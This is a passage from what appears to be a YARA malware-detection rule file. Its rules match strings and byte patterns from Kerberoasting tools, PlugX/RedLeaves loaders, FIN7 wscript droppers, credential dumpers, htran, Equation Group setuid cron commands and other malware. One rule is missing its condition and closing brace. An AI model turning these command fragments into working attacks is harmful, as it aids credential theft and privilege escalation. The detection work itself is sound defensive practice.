		$s3 = "$NTLM_hash_bytes = $NTLM_hash_bytes.Split(\"-\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Getuserspns_VBS
{
	meta:
		description = "Auto-generated rule - file GetUserSPNs.vbs"
		author = "Florian Roth (Nextron Systems)"
		id = "5576c1b9-4670-52c5-b23c-64adcc8709de"
		date = "2016-05-21"
		modified = "2023-12-05"
		reference = "https://github.com/skelsec/PyKerberoast"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_kerberoast.yar#L8-L23"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "ece81cd717fed6ca1f9053384911fd59462b6f3b01210ceeb037ba3da2f7a318"
		score = 75
		quality = 60
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "8dcb568d475fd8a0557e70ca88a262b7c06d0f42835c855b52e059c0f5ce9237"

	strings:
		$s1 = "Wscript.Echo \"User Logon: \" & oRecordset.Fields(\"samAccountName\")" fullword ascii
		$s2 = "Wscript.Echo \" USAGE:        \" & WScript.ScriptName & \" SpnToFind [GC Servername or Forestname]\"" fullword ascii
		$s3 = "strADOQuery = \"<\" + strGCPath + \">;(&(!objectClass=computer)(servicePrincipalName=*));\" & _" fullword ascii

	condition:
		2 of them
}

rule SIGNATURE_BASE_Getuserspns_PS1
{
	meta:
		description = "Auto-generated rule - file GetUserSPNs.ps1"
		author = "Florian Roth (Nextron Systems)"
		id = "a2fba75c-264f-5e89-afaf-9d19a4a90784"
		date = "2016-05-21"
		modified = "2023-12-05"
		reference = "https://github.com/skelsec/PyKerberoast"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_kerberoast.yar#L25-L41"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "204b009677a02bf8725f928c2bfff321b4543a883760e312a0c92f187684c8e9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "1b69206b8d93ac86fe364178011723f4b1544fff7eb1ea544ab8912c436ddc04"

	strings:
		$s1 = "$ForestInfo = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()" fullword ascii
		$s2 = "@{Name=\"PasswordLastSet\";      Expression={[datetime]::fromFileTime($result.Properties[\"pwdlastset\"][0])} } #, `" fullword ascii
		$s3 = "Write-Host \"No Global Catalogs Found!\"" fullword ascii
		$s4 = "$searcher.PropertiesToLoad.Add(\"pwdlastset\") | Out-Null" fullword ascii

	condition:
		2 of them
}

rule SIGNATURE_BASE_Kerberoast_PY
{
	meta:
		description = "Auto-generated rule - file kerberoast.py"
		author = "Florian Roth (Nextron Systems)"
		id = "cea6cdb2-cd1a-5701-a9d1-27c788a962a7"
		date = "2016-05-21"
		modified = "2023-12-05"
		reference = "https://github.com/skelsec/PyKerberoast"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_kerberoast.yar#L43-L59"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "3b285cc55733bd4c499ffb4821a92675806bf66faf3b3565ffb6de867bed538d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "73155949b4344db2ae511ec8cab85da1ccbf2dfec3607fb9acdc281357cdf380"

	strings:
		$s1 = "newencserverticket = kerberos.encrypt(key, 2, encoder.encode(decserverticket), nonce)" fullword ascii
		$s2 = "key = kerberos.ntlmhash(args.password)" fullword ascii
		$s3 = "help='the password used to decrypt/encrypt the ticket')" fullword ascii
		$s4 = "newencserverticket = kerberos.encrypt(key, 2, e, nonce)" fullword ascii

	condition:
		2 of them
}

rule SIGNATURE_BASE_Aptgroupx_Plugxtrojanloader_Stringdecode
{
	meta:
		description = "Rule to detect PlugX Malware"
		author = "Jay DiMartino"
		id = "c6017327-b44d-5b1d-95aa-6e1f9fbf5583"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://t.co/4xQ8G2mNap"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_plugx.yar#L2-L36"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "e5ab15b035bb0169864e687e5c26732dd5b8f5f184473a33e685f53699ce4acc"
		score = 80
		quality = 85
		tags = ""
		hash1 = "0535e8c300204e257f0fa57630f386e9fcc8e779"
		hash2 = "088ebf9ccde958f32d11f4e7eb14f5332332f97d"
		hash3 = "0c999d0bffa007e9e6b6fe593933b52f40c75b3d"
		hash4 = "2f644e7131ec0a4f12ce04ba1e54d23856dbbfbf"
		hash5 = "3be9148ad132ca342d5fbabea1119a175ef1df7c"
		hash6 = "4c1ee94ec0e15491fc4f6b4095f67eee6309e62a"
		hash7 = "587af7ce05e61d4c312d6bae12ea380116b08d7e"
		hash8 = "5990efd83b5646a7ba419541d3a2c19260224ca3"
		hash9 = "67970367c250c44a5feb263843cf45fd91336df5"
		hash10 = "68f53f7188910a4cf67843aedd38c1523f1f2e7c"
		hash11 = "962dc7e0ad37286df012f623423ac4182fe791ca"
		hash12 = "aa0976906807af2e1b127608040aa3ef6e118a13"
		hash13 = "b170d015e32b39fa4ac15f94d58e45e65cd16d6c"
		hash14 = "c9b3d2cef3b34c7ee18fc2f60ff022965959613d"
		hash15 = "cd425ce7f3e4a823d9027780e1b439759c4dc665"
		hash16 = "d5e82513c6472d3826a22d9a15c05af8c0d33b58"
		hash17 = "d9b32084f27ef13001060e1dcee8a1a9e95d89a6"
		hash18 = "daa2d1cb9148b7ba5a86fa9ab593678e77c92672"
		hash19 = "e2c098a95d1c1f0e29f207af9c5ffc5bd69a92ee"
		hash20 = "ef8cf68dc3c80e9cb5a3fa0f92b544eab583812e"
		hash21 = "f0fc0a4e4e0748464caa6a202d0083cd33458677"
		hash22 = "fe1abe55529c1d6aa6b2a2f02d7e41ea58040feb"

	strings:
		$byte1 = { 8A [2-4] 8A [2-4] FF 05 00 30 00 10 [0-5] 2A [1-6] 80 [2-7] 02 [1-6] 88 0? }
		$byte2 = { 8B [2-4] 8A [2-4] FF 05 00 30 00 10 [0-5] 2A [1-6] 80 [2-7] 02 [1-6] 88 0? }

	condition:
		any of them
}

rule SIGNATURE_BASE_APT_FIN7_Strings_Aug18_1
{
	meta:
		description = "Detects strings from FIN7 report in August 2018"
		author = "Florian Roth (Nextron Systems)"
		id = "9b940986-e41b-5fbf-9e42-cb0fd550e541"
		date = "2018-08-01"
		modified = "2023-12-05"
		reference = "https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_fin7.yar#L13-L30"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "89d2f8f28a7ab0e78c53d8c41b45efa60cfa9ff72306c49197f52342d9a3c546"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "b6354e46af0d69b6998dbed2fceae60a3b207584e08179748e65511d45849b00"

	strings:
		$s1 = "&&call %a01%%a02% /e:jscript" ascii
		$s2 = "wscript.exe //b /e:jscript %TEMP%" ascii
		$s3 = " w=wsc@ript /b " ascii
		$s4 = "@echo %w:@=%|cmd" ascii
		$s5 = " & wscript //b /e:jscript"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Deeppanda_Sl_Txt_Packed
{
	meta:
		description = "Hack Deep Panda - ScanLine sl-txt-packed"
		author = "Florian Roth (Nextron Systems)"
		id = "7a335810-2bf9-5a0b-bef4-1bade65a0f00"
		date = "2015-02-08"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_deeppanda.yar#L3-L22"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "ffb1d8ea3039d3d5eb7196d27f5450cac0ea4f34"
		logic_hash = "37f875dcb2c920278c2625085c97a9dcce1907198409595a10e6a3fbce767f35"
		score = 75
		quality = 60
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Command line port scanner" fullword wide
		$s1 = "sl.exe" fullword wide
		$s2 = "CPports.txt" fullword ascii
		$s3 = ",GET / HTTP/.}" fullword ascii

rule SIGNATURE_BASE_Deeppanda_Lot1
{
	meta:
		description = "Hack Deep Panda - lot1.tmp-pwdump"
		author = "Florian Roth (Nextron Systems)"
		id = "c72120a5-8637-580c-9856-e070dfb6df94"
		date = "2015-02-08"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_deeppanda.yar#L24-L49"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "5d201a0fb0f4a96cefc5f73effb61acff9c818e1"
		logic_hash = "92169a1288f30dc6008e1a8c9b2b700f878c90aa09634e36fea586e19657dbd1"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Unable to open target process: %d, pid %d" fullword ascii
		$s1 = "Couldn't delete target executable from remote machine: %d" fullword ascii
		$s2 = "Target: Failed to load SAM functions." fullword ascii
		$s5 = "Error writing the test file %s, skipping this share" fullword ascii
		$s6 = "Failed to create service (%s/%s), error %d" fullword ascii
		$s8 = "Service start failed: %d (%s/%s)" fullword ascii
		$s12 = "PwDump.exe" fullword ascii
		$s13 = "GetAvailableWriteableShare returned an error of %ld" fullword ascii
		$s14 = ":\\\\.\\pipe\\%s" fullword ascii
		$s15 = "Couldn't copy %s to destination %s. (Error %d)" fullword ascii
		$s16 = "dump logon session" fullword ascii
		$s17 = "Timed out waiting to get our pipe back" fullword ascii
		$s19 = "SetNamedPipeHandleState failed, error %d" fullword ascii
		$s20 = "%s\\%s.exe" fullword ascii

	condition:
		10 of them
}

rule SIGNATURE_BASE_Deeppanda_Htran_Exe
{
	meta:
		description = "Hack Deep Panda - htran-exe"
		author = "Florian Roth (Nextron Systems)"
		id = "2a551e82-aff1-5a77-bc5e-d06e49dca8bc"
		date = "2015-02-08"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_deeppanda.yar#L51-L70"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "38e21f0b87b3052b536408fdf59185f8b3d210b9"
		logic_hash = "9ac5ddc53d3d5292acb3dcf68e66bc3f6ab4b8e61a71597dd84454adc516f95d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "%s -<listen|tran|slave> <option> [-log logfile]" fullword ascii
		$s2 = "\\Release\\htran.pdb" ascii
		$s3 = "[SERVER]connection to %s:%d error" fullword ascii
		$s4 = "-tran  <ConnectPort> <TransmitHost> <TransmitPort>" fullword ascii
		$s8 = "======================== htran V%s =======================" fullword ascii
		$s11 = "-slave  <ConnectHost> <ConnectPort> <TransmitHost> <TransmitPort>" fullword ascii
		$s15 = "[+] OK! I Closed The Two Socket." fullword ascii
		$s20 = "-listen <ConnectPort> <TransmitPort>" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_Deeppanda_Trojan_Kakfum
{
	meta:
		description = "Hack Deep Panda - Trojan.Kakfum sqlsrv32.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "a204f9cb-65f8-53ea-a4eb-d89112942073"
		date = "2015-02-08"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_deeppanda.yar#L72-L90"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "0710edea973dce6f5feccf2e7e508cd5f65aa451e0bb5aca503778ffe2363401"
		score = 75
		quality = 60
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "ab58b6aa7dcc25d8f6e4b70a24e0ccede0d5f6129df02a9e61293c1d7d7640a2"
		hash2 = "c6c3bb72896f8f0b9a5351614fd94e889864cf924b40a318c79560bbbcfa372f"

	strings:
		$s0 = "%SystemRoot%\\System32\\svchost.exe -k sqlserver" fullword ascii
		$s1 = "%s\\sqlsrv32.dll" fullword ascii
		$s2 = "%s\\sqlsrv64.dll" fullword ascii
		$s3 = "%s\\%d.tmp" fullword ascii
		$s4 = "ServiceMaix" fullword ascii
		$s15 = "sqlserver" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Line_Dancer
{
	meta:
		description = "Targets code sections of Line Dancer, a shellcode loader targeting Cisco ASA devices."
		author = "NCSC"
		id = "3b49a861-8107-577a-bae1-ae28d424cc13"
		date = "2024-04-24"
		modified = "2024-04-29"
		reference = "https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/line/ncsc-tip-line-dancer.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_cisco_asa_line_dancer_apr24.yar#L2-L16"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "179e58274a792bc4a16787d251f5ad25de1271084323e62e153fa6d461e3c07e"
		score = 75
		quality = 85
		tags = ""

	strings:
		$ = { 48 8D 5E 20 48 8D 3D BB FF FF FF BA 20 00 00 00 }
		$ = { 4C 89 EE 44 89 F2 48 8D 3D 9A 27 00 00 }
		$ = { 41 FF D7 41 5F 41 5E 41 5D 41 5C 5B 5D 48 C7 C0 01 00 00 00 5F }

	condition:
		all of them
}

rule SIGNATURE_BASE_Crowdstrike_Shamoon_Droppedfile
{
	meta:
		description = "Rule to detect Shamoon malware http://goo.gl/QTxohN"
		author = "Florian Roth"
		id = "b350f1b1-db73-574b-957b-34e5a84f68b0"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "http://www.rsaconference.com/writable/presentations/file_upload/exp-w01-hacking-exposed-day-of-destruction.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_shamoon.yar#L1-L13"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "ed550832b217f7edceea2edf7c4453925ed1759d97db7728f7face6ff10ee361"
		score = 75
		quality = 85
		tags = ""

	strings:
		$testn123 = "test123" wide
		$testn456 = "test456" wide
		$testn789 = "test789" wide
		$testdomain = "testdomain.com" wide
		$pingcmd = "ping -n 30 127.0.0.1 >nul" wide

	condition:
		( any of ( $testn* ) or $pingcmd ) and $testdomain
}

rule SIGNATURE_BASE_SUSP_Qakbot_Uninstaller_Shellcode_Aug23
{
	meta:
		description = "Detects Qakbot Uninstaller files used by the FBI and Dutch National Police in a disruption operation against the Qakbot in August 2023"
		author = "Florian Roth"
		id = "860796ab-689f-5c5f-bc40-3e2ef7fd1d5d"
		date = "2023-08-30"
		modified = "2023-12-05"
		reference = "https://www.justice.gov/usao-cdca/divisions/national-security-division/qakbot-resources"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_qakbot_uninstaller.yar#L2-L14"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "91d26c50bf29517aa68e709ca3b6f32f4ca390f4c2f48e48cd251bfdd5dbcc71"
		score = 60
		quality = 85
		tags = ""

	strings:
		$xc1 = { E8 00 00 00 00 58 55 89 E5 89 C2 68 03 00 00 00 68 00 2C 00 00 05 20 0A 00 00 50 E8 05 00 00 00 83 C4 04 C9 C3 81 EC 08 01 00 00 53 55 56 57 6A 6B 58 6A 65 5B 6A 72 66 89 84 24 D4 00 00 00 33 }

	condition:
		$xc1
}

rule SIGNATURE_BASE_SUSP_Qakbot_Uninstaller_FBI_Aug23
{
	meta:
		description = "Detects Qakbot uninstaller used by the FBI / Dutch Police"
		author = "Florian Roth"
		id = "499bff56-ff49-53df-9922-227b816c0a36"
		date = "2023-08-31"
		modified = "2023-12-05"
		reference = "https://www.justice.gov/usao-cdca/divisions/national-security-division/qakbot-resources"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_qakbot_uninstaller.yar#L16-L34"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "0ce963190502709edec9434e6a64cb9db7c5553113b686afc56a516350d76baa"
		score = 60
		quality = 85
		tags = ""
		hash1 = "559cae635f0d870652b9482ef436b31d4bb1a5a0f51750836f328d749291d0b6"
		hash2 = "855eb5481f77dde5ad8fa6e9d953d4aebc280dddf9461144b16ed62817cc5071"
		hash3 = "fab408536aa37c4abc8be97ab9c1f86cb33b63923d423fdc2859eb9d63fa8ea0"

	strings:
		$op1 = { 69 c1 65 89 07 6c 03 c2 89 84 95 24 f6 ff ff 8b 55 e4 42 89 55 e4 81 fa 70 02 00 00 7c d4 }
		$op2 = { 42 89 55 e4 81 fa 70 02 00 00 7c d4 f2 0f 10 0d a0 31 00 10 33 f6 f2 0f 10 15 a8 31 00 10 66 90 }
		$op5 = { 68 48 31 00 10 6a 28 57 e8 e4 fd ff ff 8b 4d fc 83 c4 4c 33 cd 33 c0 }
		$op6 = { 33 c0 66 39 06 74 0f 0f 1f 80 00 00 00 00 40 66 83 3c 46 00 75 f8 8d 3c 00 }

	condition:
		all of them
}

rule SIGNATURE_BASE_Regin_Related_Malware
{
	meta:
		description = "Malware Sample - maybe Regin related"
		author = "Florian Roth (Nextron Systems)"
		id = "9377dd52-244f-5289-a2a3-88b6377b2dd2"
		date = "2015-06-03"
		modified = "2024-04-24"
		reference = "VT Analysis"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/spy_regin_fiveeyes.yar#L344-L367"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "76c355bfeb859a347e38da89e3d30a6ff1f94229"
		logic_hash = "61ce7a69ab357740158e355455362a4f5fddc67ee60af120733f509e7407216f"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "%c%s%c -p %d -e %d -pv -c \"~~[%x] s; .%c%c%s %s /u %s_%d.dmp; q\"" fullword wide
		$s0 = "Software\\Microsoft\\Windows NT\\CurrentVersion\\HotFix" fullword wide
		$s2 = "%x:%x:%x:%x:%x:%x:%x:%x%c" fullword ascii
		$s3 = "disp.dll" fullword ascii
		$s4 = "msvcrtd.dll" fullword ascii
		$s5 = "%d.%d.%d.%d%c" fullword ascii
		$s6 = "%ls_%08x" fullword wide
		$s8 = "d%ls%ls" fullword wide
		$s9 = "Memory location: 0x%p, size 0x%08x" fullword wide

	condition:
		$s1 or 3 of ( $s* )
}

rule SIGNATURE_BASE_Dropper_Deploysmalwareviasideloading
{
	meta:
		description = "Detects a dropper used to deploy an implant via side loading. This dropper has specifically been observed deploying REDLEAVES & PlugX"
		author = "USG"
		id = "2e7cdedd-2358-5d71-a3ec-73dec442d840"
		date = "2024-04-17"
		modified = "2024-04-17"
		reference = "https://www.us-cert.gov/ncas/alerts/TA17-117A"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_uscert_ta17-1117a.yar#L9-L21"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "51d8a0785bc25cf02460b9b7490ccba3d67806c953e6aa3d3882341ce11857fa"
		score = 75
		quality = 85
		tags = ""
		true_positive = "5262cb9791df50fafcb2fbd5f93226050b51efe400c2924eecba97b7ce437481: drops REDLEAVES. 6392e0701a77ea25354b1f40f5b867a35c0142abde785a66b83c9c8d2c14c0c3: drops plugx. "

	strings:
		$UniqueString = {2e 6c 6e 6b [0-14] 61 76 70 75 69 2e 65 78 65}
		$PsuedoRandomStringGenerator = {b9 1a [0-6] f7 f9 46 80 c2 41 88 54 35 8b 83 fe 64}

	condition:
		any of them
}

rule SIGNATURE_BASE_REDLEAVES_Droppedfile_Implantloader_Starburn
{
	meta:
		description = "Detects the DLL responsible for loading and deobfuscating the DAT file containing shellcode and core REDLEAVES RAT"
		author = "USG"
		id = "976f42b1-58c9-554b-97e6-130a657507e2"
		date = "2024-04-17"
		modified = "2024-04-17"
		reference = "https://www.us-cert.gov/ncas/alerts/TA17-117A"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_uscert_ta17-1117a.yar#L23-L34"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "2ebfdaf363ac80bc9bace3056ff86efd9c1b246c6f60373a82df4a0db901a6e3"
		score = 75
		quality = 85
		tags = ""
		true_positive = "7f8a867a8302fe58039a6db254d335ae"

	strings:
		$XOR_Loop = {32 0c 3a 83 c2 02 88 0e 83 fa 08 [4-14] 32 0c 3a 83 c2 02 88 0e 83 fa 10}

	condition:
		any of them
}

rule SIGNATURE_BASE_REDLEAVES_Droppedfile_Obfuscatedshellcodeandrat_Handkerchief
{
	meta:
		description = "Detects obfuscated .dat file containing shellcode and core REDLEAVES RAT"
		author = "USG"
		id = "51a28529-1084-5f24-9369-6427e8d51d9d"
		date = "2024-04-17"
		modified = "2024-04-17"
		reference = "https://www.us-cert.gov/ncas/alerts/TA17-117A"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_uscert_ta17-1117a.yar#L36-L47"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "f91bd1ddd6691a0a5b6ebc6a28d35bb5b2e6c00754f07e58ffb01e06ad590ae3"
		score = 75
		quality = 83
		tags = ""
		true_positive = "fb0c714cd2ebdcc6f33817abe7813c36"

	strings:
		$RedleavesStringObfu = {73 64 65 5e 60 74 75 74 6c 6f 60 6d 5e 6d 64 60 77 64 72 5e 65 6d 6d 6c 60 68 6f 2f 65 6d 6d}

	condition:
		any of them
}

rule SIGNATURE_BASE_PLUGX_Redleaves
{
	meta:
		description = "Detects specific RedLeaves and PlugX binaries"
		author = "US-CERT Code Analysis Team"
		id = "ede8ad8f-31cf-5314-9777-bddd60e499f2"
		date = "2017-03-04"
		date = "2017-04-03"
		modified = "2024-04-17"
		reference = "https://www.us-cert.gov/ncas/alerts/TA17-117A"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_uscert_ta17-1117a.yar#L66-L93"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "0c52110eb18dcdb7a0d4b8c42f22368acdd1bce44a192abcd71a20bee2705475"
		score = 75
		quality = 85
		tags = ""
		incident = "10118538"
		MD5_1 = "598FF82EA4FB52717ACAFB227C83D474"
		MD5_2 = "7D10708A518B26CC8C3CBFBAA224E032"
		MD5_3 = "AF406D35C77B1E0DF17F839E36BCE630"
		MD5_4 = "6EB9E889B091A5647F6095DCD4DE7C83"
		MD5_5 = "566291B277534B63EAFC938CDAAB8A399E41AF7D"

	strings:
		$s0 = { 80343057403D2FD0010072F433C08BFF80343024403D2FD0010072F4 }
		$s1 = "C:\\Users\\user\\Desktop\\my_OK_2014\\bit9\\runsna\\Release\\runsna.pdb"
		$s2 = "d:\\work\\plug4.0(shellcode)"
		$s3 = "\\shellcode\\shellcode\\XSetting.h"
		$s4 = { 42AFF4276A45AA58474D4C4BE03D5B395566BEBCBDEDE9972872C5C4C5498228 }
		$s5 = { 8AD32AD002D180C23830140E413BCB7CEF6A006A006A00566A006A00 }
		$s6 = { EB055F8BC7EB05E8F6FFFFFF558BEC81ECC8040000535657 }
		$s7 = { 8A043233C932043983C10288043283F90A7CF242890D18AA00103BD37CE2891514AA00106A006A006A0056 }
		$s8 = { 293537675A402A333557B05E04D09CB05EB3ADA4A4A40ED0B7DAB7935F5B5B08 }
		$s9 = "RedLeavesCMDSimulatorMutex"

	condition:
		$s0 or $s1 or $s2 and $s3 or $s4 or $s5 or $s6 or $s7 or $s8 or $s9
}

rule SIGNATURE_BASE_Equationgroup_Elgingamble
{
	meta:
		description = "Equation Group hack tool leaked by ShadowBrokers- file elgingamble"
		author = "Florian Roth (Nextron Systems)"
		id = "fc8a63a1-9deb-5051-a02d-ed26fd1cae95"
		date = "2017-04-08"
		modified = "2023-12-05"
		reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_eqgrp_apr17.yar#L362-L378"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "e561794d969b6198f71115087db8cc89043f2079252eef22458450e16596b0eb"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "0573e12632e6c1925358f4bfecf8c263dd13edf52c633c9109fe3aae059b49dd"

	strings:
		$x1 = "* * * * * root chown root %s; chmod 4755 %s; %s" fullword ascii
		$x2 = "[-] kernel not vulnerable" fullword ascii
		$x3 = "[-] failed to spawn shell: %s" fullword ascii
		$x4 = "-s shell           Use shell instead of %s" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_Equationgroup_Estesfox
{
	meta:
		description = "Equation Group hack tool leaked by ShadowBrokers- file estesfox"
		author = "Florian Roth (Nextron Systems)"
		id = "f2e8b8ba-af09-5e7c-a99c-4f620a0917c9"
		date = "2017-04-08"
		modified = "2023-12-05"
		reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_eqgrp_apr17.yar#L801-L814"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "bfbc8ac62dcb61b492b1803de535f51ceb54ac83e45071270a6ef5faeaa521b2"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "33530cae130ee9d9deeee60df9292c00242c0fe6f7b8eedef8ed09881b7e1d5a"

	strings:
		$x1 = "chown root:root x;chmod 4777 x`' /tmp/logwatch.$2/cron" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_MAL_JS_Efile_Apr23_1
{
	meta:
		description = "Detects JavaScript malware used in eFile compromise"
		author = "Florian Roth"
		id = "ba7a8b2c-789c-5bc5-be53-f2b92c7039e1"
		date = "2023-04-06"
		modified = "2023-12-05"
		reference = "https://twitter.com/Ax_Sharma/status/1643178696084271104/photo/1"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/mal_efile_apr23.yar#L2-L15"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "6d94162e5719b92d9df349e7d48cd70e218998b0e120870a435a8073fa49c532"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "let payload_chrome = "
		$s2 = "else if (agent.indexOf(\"firefox"

	condition:
		all of them
}

rule SIGNATURE_BASE_MAL_PHP_Efile_Apr23_1
{
	meta:
		description = "Detects malware "
		author = "Florian Roth"
		id = "d663b38e-b082-5cf7-9853-f4685bf3a87b"
		date = "2023-04-06"
		modified = "2023-12-05"
		reference = "https://twitter.com/malwrhunterteam/status/1642988428080865281?s=12&t=C0_T_re0wRP_NfKa27Xw9w"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/mal_efile_apr23.yar#L18-L32"
